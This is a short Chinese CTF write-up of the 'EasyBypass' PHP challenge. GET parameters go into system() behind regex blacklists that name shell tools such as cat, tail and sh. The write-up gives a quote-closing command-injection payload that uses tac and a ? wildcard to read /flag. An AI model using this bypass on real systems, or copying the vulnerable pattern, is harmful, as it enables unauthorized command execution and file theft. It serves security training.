---
title: EasyBypass
date: 2025-04-20 21:47:46
tags:
- php代码审计
- rce
- 闭合
category:
- 刷题笔记
---

# EasyBypass

源码：

```
<?php

highlight_file(__FILE__);

$comm1 = $_GET['comm1'];
$comm2 = $_GET['comm2'];


if(preg_match("/\'|\`|\\|\*|\n|\t|\xA0|\r|\{|\}|\(|\)|<|\&[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is", $comm1))
    $comm1 = "";
if(preg_match("/\'|\"|;|,|\`|\*|\\|\n|\t|\r|\xA0|\{|\}|\(|\)|<|\&[^\d]|@|\||ls|\||tail|more|cat|string|bin|less||tac|sh|flag|find|grep|echo|w/is", $comm2))
    $comm2 = "";

$flag = "#flag in /flag";

$comm1 = '"' . $comm1 . '"';
$comm2 = '"' . $comm2 . '"';

$cmd = "file $comm1 $comm2";
system($cmd);
?>
cannot open `' (No such file or directory)
```

代码审计

过滤了cat和一些命令，但是没有过滤tac，用tac

过滤了了flag和*，用fla?绕过

在最后一段可以看到已经执行了一个命令，所以我们需要使用 ; 结束上一个命令

因为在comm2中，;符号和tac被过滤掉了，所以我们使用comm1文件包含

在前后加"，用来闭合源码拼接的双引号

payload：

```
?comm1=";tac%20/fla?"
```

















